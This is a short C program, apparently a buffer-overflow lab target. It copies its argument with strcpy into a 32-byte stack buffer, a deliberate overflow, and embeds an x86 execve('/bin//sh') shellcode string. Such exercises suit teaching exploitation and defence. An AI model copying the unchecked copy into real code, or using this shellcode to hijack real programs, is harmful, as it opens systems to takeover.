#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static const char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68"
				"\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89"
				"\xe1\x31\xd2\xb0\x0b\xcd\x80";

static void do_nothing_successfully(const char *str)
{
	char buffer[32];
	strcpy(buffer, str);
}

int main(int argc, char **argv)
{
	if (argc != 2) {
		fprintf(stderr, "Usage: %s string\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	do_nothing_successfully(argv[1]);

	return 0;
}
